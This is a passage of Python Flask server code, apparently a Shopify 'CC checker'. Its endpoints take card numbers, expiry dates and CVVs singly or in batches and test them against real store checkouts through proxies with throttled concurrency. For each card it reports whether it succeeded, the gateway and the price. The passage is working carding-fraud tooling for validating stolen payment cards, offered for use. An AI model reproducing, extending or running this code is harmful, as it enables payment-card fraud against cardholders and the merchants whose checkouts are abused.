                        return cs, False, "Invalid CC format", "UNKNOWN", "0.00", "USD"
                    tasks.append(_bad())
                else:
                    async def _check(cs=cc_string, p=parts, prx=px):
                        try:
                            success, msg, gw, price, cur = await _throttled_process(
                                p['cc'], p['mes'], p['ano'], p['cvv'],
                                site, variant_id, prx, timeout_sec, uid=uid
                            )
                            return cs, success, msg, gw, price, cur
                        except Exception as ex:
                            return cs, False, str(ex), "UNKNOWN", "0.00", "USD"
                    tasks.append(_check())

            return await asyncio.gather(*tasks)

        future_timeout = max(300, (len(cards) * 3) + timeout_sec + 60)
        future = asyncio.run_coroutine_threadsafe(_run_batch(), loop)
        results = future.result(timeout=future_timeout)

        output = []
        for cc_string, success, message, gateway, price, currency in results:
            output.append(_build_result(cc_string, success, message, gateway, price, currency, site))

        return jsonify(output)

    except Exception as e:
        logger.error(f"Error in batch_checker: {e}")
        return jsonify({"error": str(e), "status": False}), 500

# ── Site-only check endpoint ──────────────────────────────────────────
@app.route('/site_check', methods=['GET'])
def site_check():
    try:
        site = request.args.get('site') or request.args.get('url')
        proxy_str = request.args.get('proxy')
        timeout_val = request.args.get('timeout')
        timeout_sec = _parse_timeout_value(timeout_val, 20)

        if not site:
            return jsonify({"valid": False, "error": "Missing 'site' parameter"}), 400

        ourl = site if site.startswith('http') else f'https://{site}'

        loop = get_event_loop()
        future = asyncio.run_coroutine_threadsafe(
            fetch_products(ourl, proxy_str, timeout_sec),
            loop
        )
        result = future.result(timeout=timeout_sec + 10)

        if isinstance(result, tuple) and result[0] is False:
            return jsonify({
                "valid": False,
                "site": site,
                "error": str(result[1])
            })

        return jsonify({
            "valid": True,
            "site": site,
            "variant_id": result.get('variant_id'),
            "price": result.get('price'),
            "link": result.get('link'),
            "currency": result.get('currency', 'USD'),
            "requires_shipping": result.get('requires_shipping', False)
        })

    except Exception as e:
        logger.error(f"Error in site_check: {e}")
        return jsonify({"valid": False, "site": request.args.get('site', ''), "error": str(e)}), 500

# ── Clear Cache endpoint ──────────────────────────────────────────────
@app.route('/delcache', methods=['GET'])
def clear_cache():
    global _VARIANT_CACHE
    cleared = len(_VARIANT_CACHE)
    _VARIANT_CACHE.clear()
    logger.info(f"Cache cleared: {cleared} items removed")
    return jsonify({"status": "success", "cleared": cleared})

# ── Status endpoint ──────────────────────────────────────────────────
@app.route('/status', methods=['GET'])
def status():
    cached_count = len(_VARIANT_CACHE)
    with _SESSION_POOL_STATE_LOCK:
        pool_stats = {k: len(v) for k, v in _SESSION_POOL.items()}
    pool_total = sum(pool_stats.values())

    sys_stats = {}
    try:
        import psutil, time as _time
        sys_stats["cpu_usage"] = psutil.cpu_percent(interval=None)
        ram = psutil.virtual_memory()
        sys_stats["ram_percent"] = ram.percent
        sys_stats["ram_used_gb"] = round(ram.used / (1024**3), 1)
        sys_stats["ram_total_gb"] = round(ram.total / (1024**3), 1)
        uptime_seconds = _time.time() - psutil.boot_time()
        days, rem = divmod(uptime_seconds, 86400)
        hours, rem = divmod(rem, 3600)
        minutes, _ = divmod(rem, 60)
        sys_stats["uptime_str"] = f"{int(days)}d {int(hours)}h {int(minutes)}m"
    except Exception as e:
        sys_stats["error"] = str(e)

    return jsonify({
        "status": "online",
        "max_concurrent": MAX_CONCURRENT,
        "active_workers": ACTIVE_WORKERS,
        "max_per_site": _get_max_per_site(),
        "variant_cache_size": cached_count,
        "session_pool": pool_stats,
        "session_pool_total_idle": pool_total,
        "system_specs": sys_stats,
        "endpoints": {
            "single":     "GET /shopify?site=...&cc=...&proxy=...",
            "batch":      "POST /batch {site, cards[], proxy}",
            "site_check": "GET /site_check?site=...&proxy=... (pre-warm cache, no CC)",
            "status":     "GET /status"
        }
    })

atexit.register(stop_background_loop)

if __name__ == "__main__":
    logger.info(f"[ENGINE] Max concurrency: {MAX_CONCURRENT} cards")
    logger.info("[ENGINE] Single:     GET /shopify?site=...&cc=...&proxy=...")
    logger.info("[ENGINE] Batch:      POST /batch  {site, cards[], proxy}")
    logger.info("[ENGINE] Site-check: GET /site_check?site=...&proxy=... (pre-warm variant cache)")
    get_event_loop()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
